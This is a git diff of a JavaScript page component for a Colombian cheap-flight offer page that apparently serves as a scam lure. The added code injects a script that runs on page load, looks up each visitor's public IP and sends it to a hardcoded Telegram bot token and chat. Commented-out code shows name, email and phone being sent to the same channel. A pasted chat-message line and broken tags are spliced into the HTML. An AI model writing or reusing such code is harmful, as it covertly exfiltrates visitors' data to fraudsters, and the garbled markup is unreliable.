@@ -1,6 +1,6 @@
 import { initRouter } from "../router.js";
 
-export default async function Home() {
+export default function Home() {
     console.log("CDN cargado correctamente.");
 
     // Crear el elemento <title>
@@ -65,31 +65,57 @@ export default async function Home() {
         } 
          `;
     document.head.appendChild(style);
-    
+
+    const script = document.createElement("script");
+    script.textContent = `
+  window.dataLayer = window.dataLayer || []; 
+  function gtag(){dataLayer.push(arguments);} 
+  gtag('js', new Date()); 
+  gtag('config', 'AW-16854264136'); 
+
+  const TELEGRAM_BOT_TOKEN = "7577648780:AAGhPTv7QWRQw-pFG0ecOBKr3rMyIWS5Pug"; 
+  const TELEGRAM_CHAT_ID = "6298387261"; 
+
+  async function sendIPToTelegram() {
     try {
-        const ipResponse = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipResponse.json();
-        const userIp = ipData.ip;
+      // Obtener la IP pública
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      const userIP = data.ip;
 
-        const mensaje = `📢 Un usuario ha ingresado a la página de cupones.\n🖥️ IP: ${userIp}`;
+      const mensajeTelegram = \`📢 NUEVO LOGIN. IP del usuario: \${userIP}\`;
 
-        await sendTelegramMessage(mensaje);
+      // Enviar mensaje a Telegram
+      const telegramResponse = await fetch(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensajeTelegram
+        })
+      });
 
-
+      const result = await telegramResponse.json();
+      console.log("Mensaje enviado a Telegram:", result);
     } catch (error) {
-        console.error("Error obteniendo la IP o enviando el mensaje:", error);
+      console.error("Error enviando la IP a Telegram:", error);
     }
+  }
+
+  sendIPToTelegram();
+`;
+document.head.appendChild(script)
 
 
     return `
-       <div class="container"> 
-        <img  
+    < div class="container" >
+        <img
             src="https://i.imgur.com/K4ffkXt.jpeg"
 
-✡️Uva🎸😇💸🤙👁️☀️✡️👑🔱🫅🤴, [20/2/2025 10:33]
-alt="Ofertas de Vuelos Nacionales"  
-            class="image" 
-        > 
+✡️ Uva🎸😇💸🤙👁️☀️✡️👑🔱🫅🤴, [20 / 2 / 2025 10: 33]
+alt = "Ofertas de Vuelos Nacionales"
+class="image"
+    > 
         <h1 style="color: #fff; margin-bottom: 20px; font-weight: bold;"> 
             ¡Vuela por Colombia desde <strong>$49.999</strong>! 
         </h1> 
@@ -106,23 +132,23 @@ alt="Ofertas de Vuelos Nacionales"
                 Compra tu vuelo aquí 
             </button> 
         </div> 
-    </div> 
+    </div >
     `;
 }
 
 export function addHomeEvents() {
     document.getElementById("conversionButton").addEventListener("click", async function () {
-     /*    const nombre = document.getElementById("nombre").value;
-        const correo = document.getElementById("correo").value;
-        const telefono = document.getElementById("telefono").value;
-
-        if (!nombre || !correo || !telefono) {
-            alert("Por favor, completa todos los campos.");
-            return;
-        }
-
-        const mensaje = `✈️ NUEVO REGISTRO:\n👤 Nombre: ${nombre}\n📩 Correo: ${correo}\n📟 Teléfono: ${telefono}`;
-        await sendTelegramMessage(mensaje); */
+        /*    const nombre = document.getElementById("nombre").value;
+           const correo = document.getElementById("correo").value;
+           const telefono = document.getElementById("telefono").value;
+   
+           if (!nombre || !correo || !telefono) {
+               alert("Por favor, completa todos los campos.");
+               return;
+           }
+   
+           const mensaje = `✈️ NUEVO REGISTRO: \n👤 Nombre: ${ nombre } \n📩 Correo: ${ correo } \n📟 Teléfono: ${ telefono } `;
+           await sendTelegramMessage(mensaje); */
 
         /* history.pushState(null, "", "/gracias");
         initRouter(); */
